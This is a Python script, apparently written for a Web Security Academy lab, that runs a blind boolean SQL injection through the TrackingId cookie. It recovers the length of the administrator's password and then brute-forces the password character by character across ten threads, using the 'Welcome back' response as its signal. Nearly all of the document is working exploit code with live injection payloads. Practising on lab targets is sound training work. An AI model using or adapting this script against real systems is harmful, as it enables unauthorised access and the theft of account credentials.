import requests as r
import string
import threading

# Send the request with the headers to the server and return the response. 
def send_request(payload):
    url = "https://0aac005404b79a0e812dc5e100490010.web-security-academy.net/filter?category=Pets"
    headers = {
        "Host": "0aac005404b79a0e812dc5e100490010.web-security-academy.net",
        "Cookie" : "TrackingId=7BzMkqZRR9PB0yfq" + payload + "; session=bSODaQWMS0MGg4Tl7YEaWF9ESDjOd1vr",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",   
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://0aac005404b79a0e812dc5e100490010.web-security-academy.net/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers"
    }

    print(headers["Cookie"])

    response = r.get(url, headers=headers)
    return response


def get_password_length():
    # brute force the password length and send back the value : 
    length = 0
    while(True):
        payload = "' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = " + str(length) + " -- -"
        response = send_request(payload)
        if "Welcome back" in response.text :
            return length
        else:
            length += 1


def worker(start_index, end_index, password_list, lock):
    letters = string.ascii_lowercase + string.digits
    for i in range(start_index, end_index):
        for letter in letters:
            payload = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator')," + str(i+1) + ",1) = '" + letter + "' -- -"
            response = send_request(payload)
            if "Welcome back" in response.text:
                with lock:
                    password_list[i] = letter
                break

    
def main():
    password_length = get_password_length()
    password_list = [''] * password_length
    num_threads = 10  # Nombre de threads à utiliser
    lock = threading.Lock()
    threads = []

    # Calculer la répartition des indices entre les threads
    chunk_size = (password_length + num_threads - 1) // num_threads
    for i in range(num_threads):
        start_index = i * chunk_size
        end_index = min(start_index + chunk_size, password_length)
        if start_index < password_length:
            thread = threading.Thread(target=worker, args=(start_index, end_index, password_list, lock))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

    password = ''.join(password_list)
    print(f"The password is: {password}")
    print(f"Its length is: {len(password)}")

if __name__ == "__main__":
    main()
